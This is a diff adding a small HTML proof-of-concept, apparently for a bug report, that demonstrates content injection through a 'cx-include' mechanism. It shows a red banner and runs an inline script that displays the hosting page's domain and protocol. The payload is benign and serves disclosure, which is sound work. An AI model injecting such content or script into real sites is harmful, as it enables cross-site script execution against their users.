@@ -1,0 +1,11 @@
+<div id="cx-include-poc" style="background:#c00;color:#fff;padding:15px;font-family:Arial,sans-serif;border:3px solid #900;margin:5px;border-radius:5px">
+<h3 style="margin:0 0 8px">Content Injection via cx-include</h3>
+<p style="margin:0 0 5px">Loaded from: naysser.github.io/svg/include-test.html</p>
+<p style="margin:0" id="cx-poc-info">Domain detection pending...</p>
+</div>
+<script>
+try {
+  var el = document.getElementById('cx-poc-info');
+  if (el) el.textContent = 'Domain: ' + document.domain + ' | Protocol: ' + location.protocol;
+} catch(e) {}
+</script>
